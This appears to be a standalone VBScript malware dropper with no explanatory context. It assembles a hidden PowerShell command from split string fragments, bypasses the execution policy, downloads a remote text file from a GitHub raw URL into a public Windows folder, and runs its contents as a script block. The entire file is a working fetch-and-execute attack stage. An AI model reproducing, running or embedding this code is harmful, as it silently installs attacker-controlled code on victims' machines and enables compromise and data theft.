WScript.Sleep 3000
On Error Resume Next

Q4 = " -windo 1 "
Q3 = "powershell.exe"
Q2 = "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/nmaroun/fiijjjjjkgjhghgh.html/main/m3.txt', 'C:\Users\Public\Libraries\m3.txt');$AnyF = Get-Content C:\Users\Public\Libraries\m3.txt -Raw; $dBlock = [System.Management.Automation.ScriptBlock]::Create($AnyF); & $dBlock"
Q7 = " -exec "
Q8 = "bypass "
Q5 = "-noexit"
wind = "WScript.Shell"
set Qnv = CreateObject(wind)
RECALC = Q3+Q4+Q5+Q7+Q8+Q2
Qnv.Run RECALC,0
Set objFSO = CreateObject( "Scripting.FileSystemObject" )
set filename1=objFSO.GetFile("C:\Users\Public\Libraries\m3.txt")
WScript.Sleep(5000)

